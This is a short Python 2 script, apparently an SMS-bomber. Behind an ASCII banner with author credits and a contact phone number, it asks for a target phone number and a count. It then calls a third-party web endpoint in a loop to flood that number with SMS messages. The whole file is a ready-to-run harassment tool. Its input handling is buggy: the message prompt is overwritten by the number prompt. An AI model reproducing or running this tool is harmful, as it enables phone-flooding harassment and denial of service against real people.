#!/usr/bin/python2
#coding:utf-8
#recorde by MR.CUPU
B ='\033[1;92m'
import logging,requests,itertools
log = logging.getLogger("[SazXt]");log.setLevel(logging.INFO);ch = logging.StreamHandler();ch.setLevel(logging.INFO);fot = logging.Formatter('\r\033[32m%(levelname)s:\033[37m%(name)s: %(message)s');ch.setFormatter(fot);log.addHandler(ch)
pk= 0
def ha():
        try:
		global pk
		af = lambda x:[i for i in itertools.chain(range(1,x+1),range(x-1,0,-1))]
		u = "\n".join(["%s%s"%(' '*(5-i),''.join([str(j) for j in af(i)])) for i in af(5)])
                print "\033[1;97m█████████"
                print "\033[1;97m█▄█████▄█      \033[1;96m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●"
                print "\033[1;97m█\033[1;91m▼▼▼▼▼ \033[1;97m- _ --_--\033[1;92m    ~#:MR.CUPU~#:"
                print "\033[1;97m█ \033[1;97m \033[1;97m_-_-- -_ --__\033[1;92mThank's to : Allah Swt"
                print "\033[1;97m█\033[1;91m▲▲▲▲▲\033[1;97m--  - _ --\033[1;92m \033[1;93mCUPU PANDAI BERKARYA"
                print "\033[1;97m█████████      \033[1;96m«°°°°°°°°°°✧°°°°°°°°°°»"
                print "\033[1;97m ██ ██"
                print "\033[1;97m╔════════════════════════════════════════╗"
                print "\033[1;97m║\033[1;93m* \033[1;97mAUTHOR  \033[1;91m: \033[1;96mARJUN_24   \033[1;97m                 ║"
                print "\033[1;97m║\033[1;93m* \033[1;97mKONTAK  \033[1;91m: \033[1;96m083869752666                \033[1;97m║"
                print "\033[1;97m║\033[1;93m* \033[1;97mFB      \033[1;91m: \033[1;92m\033[4mTjonk Notfound              \033[0m\033[1;97m║"
                print "\033[1;97m║\033[1;93m* \033[1;97mThanks \033[1;91m : \033[1;92m\033[4mAllah Swt\033[0m                   \033[1;97m║"
                print "\033[1;97m╚════════════════════════════════════════╝"
		print B+"~# AUTHOR : MR.CUPU and MR.J3MB3N9"
                print B+"~# TEAM   : GOMBONG EROR SYSTEM"
                print B+"~# THANK's: ALLAH SWT"
                print
                _intp_ = raw_input("[+] Masukan Pesan : ")
		_intp_ = raw_input("[+] No Target : ")
		_cout_ = int(raw_input("[+] Jumlah : "))
		while pk < _cout_:
			pk += 1
			_send = requests.get('https://sinafipika.000webhostapp.com/sms.php/sms.php?nomor=' + str(_intp_) + '&paket=' + str(pk))
			log.info("[!] Progeess [ %s ]"%(_send))
	except:
		log.warning("[!] Close Progress !")

ha()
